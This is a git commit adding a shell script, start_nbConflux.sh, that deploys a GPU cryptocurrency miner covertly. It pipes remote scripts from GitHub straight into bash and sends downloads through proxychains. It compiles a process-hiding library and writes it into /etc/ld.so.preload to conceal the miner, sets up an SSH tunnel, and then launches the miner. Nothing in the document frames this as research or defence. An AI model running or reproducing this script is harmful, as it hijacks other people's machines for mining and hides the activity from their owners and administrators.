5928c4c83e525bdb48b2ce4ecb01685cc8c9147b
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-03-04 12:37:45 +0200

    Create start_nbConflux.sh

---
+++ start_nbConflux.sh
@@ -0,0 +1,16 @@
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/sockd/main/chains.sh | bash
+sleep .1
+proxychains curl ifconfig.me
+proxychains wget https://github.com/NebuTech/NBMiner/releases/download/v36.1/NBMiner_36.1_Linux.tgz
+tar -xvzf NBMiner_36.1_Linux.tgz
+cd NBMiner_Linux
+proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/nbConflux.sh
+chmod +x nbConflux.sh
+proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNb.zip
+unzip magicNb.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/setUpSSHTunnel.sh | bash
+./nbConflux.sh
